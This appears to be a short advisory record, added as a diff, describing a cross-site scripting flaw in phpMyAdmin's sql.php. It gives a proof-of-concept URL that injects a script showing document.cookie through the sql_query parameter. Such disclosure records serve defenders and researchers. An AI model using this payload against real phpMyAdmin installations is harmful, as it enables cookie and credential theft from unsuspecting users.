@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/17487/info
+
+PHPMyAdmin is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input. 
+
+An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+http://www.example.com//phpmyadmin/sql.php?lang=de-utf-8&server=1&collation_connection=utf8_general_ci&db=fu&table=fu&goto=tbl_properties_structure.php&back=tbl_properties_structure.php&sql
+_query=SELECT+*+FROM+%60'%3Cscript%3Ealert(document.cookie)%3C/script%3E'%60
